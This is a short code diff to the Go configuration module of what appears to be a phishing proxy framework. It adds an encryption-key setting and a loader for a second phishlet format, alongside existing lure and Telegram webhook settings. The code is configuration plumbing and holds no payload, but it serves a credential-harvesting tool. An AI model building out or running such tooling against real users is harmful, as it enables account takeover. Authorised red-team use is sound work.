@@ -72,6 +72,7 @@ type GeneralConfig struct {
 	DnsPort         int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
 	Autocert        bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
 	WebhookTelegram string `mapstructure:"webhook_telegram" json:"webhook_telegram" yaml:"webhook_telegram"`
+	EncryptionKey   string `mapstructure:"enc_key" json:"enc_key" yaml:"enc_key"`
 }
 
 type Config struct {
@@ -88,6 +89,7 @@ type Config struct {
 	lureIds         []string
 	subphishlets    []*SubPhishlet
 	cfg             *viper.Viper
+	v2Loader        *PhishletV2Loader
 }
 
 const (
@@ -720,7 +722,21 @@ func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, er
 	return nil, fmt.Errorf("lure for path '%s' not found", path)
 }
 
+func (c *Config) SetV2Loader(loader *PhishletV2Loader) {
+	c.v2Loader = loader
+}
+
+func (c *Config) GetV2Loader() *PhishletV2Loader {
+	return c.v2Loader
+}
+
 func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
+	if c.v2Loader != nil {
+		if v2Phishlet, ok := c.v2Loader.GetPhishlet(site); ok {
+			return v2Phishlet.ToLegacyPhishlet(), nil
+		}
+	}
+
 	pl, ok := c.phishlets[site]
 	if !ok {
 		return nil, fmt.Errorf("phishlet '%s' not found", site)
@@ -821,4 +837,14 @@ func (c *Config) GetDnsApiKey() string {
 
 func (c *Config) GetDnsApiSecret() string {
 	return c.certificates.DnsApiSecret
+}
+
+func (c *Config) GetEncryptionKey() string {
+	return c.general.EncryptionKey
+}
+
+func (c *Config) SetEncryptionKey(key string) {
+	c.general.EncryptionKey = key
+	c.cfg.Set(CFG_GENERAL, c.general)
+	c.cfg.WriteConfig()
 }
